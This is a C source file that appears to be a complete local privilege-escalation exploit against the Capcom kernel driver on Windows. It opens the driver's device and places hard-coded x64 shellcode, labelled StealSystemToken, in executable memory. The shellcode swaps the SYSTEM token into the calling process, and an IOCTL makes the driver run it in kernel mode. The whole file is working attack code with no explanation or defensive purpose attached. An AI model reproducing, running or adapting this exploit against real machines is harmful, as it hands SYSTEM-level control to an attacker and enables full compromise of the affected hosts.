#include <Windows.h>

#define CAPCOM_DEVICE_NAME L"\\\\.\\Htsysm72FB"
#define CAPCOM_DEVICE_TYPE 0xAA01
#define CAPCOM_FUNCTION 0xC11
#define CAPCOM_IO_CONTROL_CODE CTL_CODE(CAPCOM_DEVICE_TYPE, CAPCOM_FUNCTION, METHOD_BUFFERED, FILE_ANY_ACCESS) 

struct IoControlInput {
	PCHAR PassCheck;
	CHAR Shellcode[83];
};

const CHAR StealSystemToken[84] = ""
"\x57\x56\x51\x50\x65\x48\x8b\x3c\x25\x88\x01\x00\x00\x48\x8b\x7f"
"\x70\x48\x8b\x8f\x88\x01\x00\x00\x48\x8b\xbf\x90\x02\x00\x00\x48"
"\x8b\x09\x48\x8b\x41\xf8\x48\x83\xf8\x04\x75\xf3\x48\x8b\xb1\x80"
"\x00\x00\x00\x40\x80\xe6\xf0\x48\x8b\x09\x48\x8b\x41\xf8\x48\x39"
"\xf8\x0f\x85\xf0\xff\xff\xff\x48\x89\xb1\x80\x00\x00\x00\x58\x59"
"\x5e\x5f\xc3";

BOOL main() {
	LPCTSTR DeviceName = CAPCOM_DEVICE_NAME;
	HANDLE Device;
	DWORD IoControlCode = CAPCOM_IO_CONTROL_CODE;
	struct IoControlInput *IoControlInput = NULL;
	LPVOID InBuffer = NULL;
	DWORD OutBuffer = 0;
	DWORD BytesReturned = 0;

	// Get a handle to the device.
	if ((Device = CreateFile(
		DeviceName,
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	)) == INVALID_HANDLE_VALUE)
		return CloseHandle(Device);

	// Allocate memory for the input to the IoControl.
	if ((IoControlInput = (struct IoControlInput *)VirtualAlloc(
		NULL,
		sizeof(struct IoControlInput),
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE
	)) == NULL)
		return CloseHandle(Device);
	
	// Set the values of the input to the IoControl.
	IoControlInput->PassCheck = (PCHAR)(&IoControlInput->Shellcode);
	CopyMemory(&IoControlInput->Shellcode, StealSystemToken, 83);
	InBuffer = (LPVOID)(&IoControlInput->Shellcode);

	// Invoke the IoControl, which will call the Shellcode.
	DeviceIoControl(Device, IoControlCode, &InBuffer, 8, &OutBuffer, 4, &BytesReturned, NULL);

	return CloseHandle(Device);
}